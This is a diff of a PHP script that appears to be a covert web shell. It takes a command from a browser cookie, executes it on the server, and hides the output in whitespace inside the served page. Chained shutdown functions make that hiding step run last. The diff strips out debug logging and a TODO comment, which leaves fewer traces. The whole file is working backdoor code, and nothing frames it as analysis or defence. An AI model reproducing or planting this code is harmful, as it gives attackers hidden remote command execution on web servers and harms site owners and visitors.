@@ -9,13 +9,6 @@ error_reporting(E_ALL);
  * @date	2014-02-18
  */
 
-/**
- * @TODO
- *
- * check if cookie['cmd'] isset and pipe to command
- * content merger 
- *
- */
 
 # Configuration
 
@@ -45,44 +38,31 @@ function wcc_init() {
 		empty($_COOKIE[WCC_COOKIE_KEY])
 	) return false; # early return
 
-    wcc_log("Starting WCC");
-
 	# Start buffering
 	ob_start();
-    wcc_log("> Output Buffering started");
 
 	# Exec command
 	$cmd_output = wcc_exec($_COOKIE[WCC_COOKIE_KEY]); # gzipped to reduce payload size & whitespaced
-    wcc_log("> Command executed and encoded");
 
 	# Register shutdown function that registers a 
 	# shutdown function as last in chain ;)
 	# (unless another shutdown functions does the same)
 	register_shutdown_function('wcc_shutdown', $cmd_output);
-    wcc_log("> Primary shutdown function registered");
 
 	return true;
 
 }//end :: wcc_init
 
-function wcc_log($msg) {
-    error_log("$msg\n", 3, "/var/www/wcc/wcc.log");
-}
-
 function wcc_shutdown($whitespace_payload) {
-    wcc_log("Primary shutdown function hit");
 	register_shutdown_function('wcc_merge_output', $whitespace_payload); # register last ;)
-    wcc_log("> Secondary shutdown function registered");
 }//end :: wcc_shutdown
 
 function wcc_merge_output($whitespace_payload) {
 
-    wcc_log("Initiating output merge");
 	# Get value of output buffer so far
 	$page_content = ob_get_contents();
 	# Stop buffering
 	ob_end_clean();
-    wcc_log("> Output Buffering stopped and cleaned");
 
 	# "Sanitize" page content
 	$sanitized_content = str_replace(TAB, SPACE, $page_content);
@@ -90,18 +70,14 @@ function wcc_merge_output($whitespace_payload) {
 
 	$content_tokens = wcc_tokenize_content($content_lines);
 	$whitespace_tokens = wcc_tokenize_whitespace($whitespace_payload);
-    wcc_log("> Tokens created");
 
 	# Build Content
 	$final_content = wcc_build_content($whitespace_tokens, $content_tokens);
-    wcc_log("> Content built");
 
 	# Show content
 	print $final_content;
-    wcc_log("> Content shown");
 
 	# Force 'clean' exit
-    wcc_log("> Exitting");
 	exit(0);
 
 }//end :: wcc_merge_output
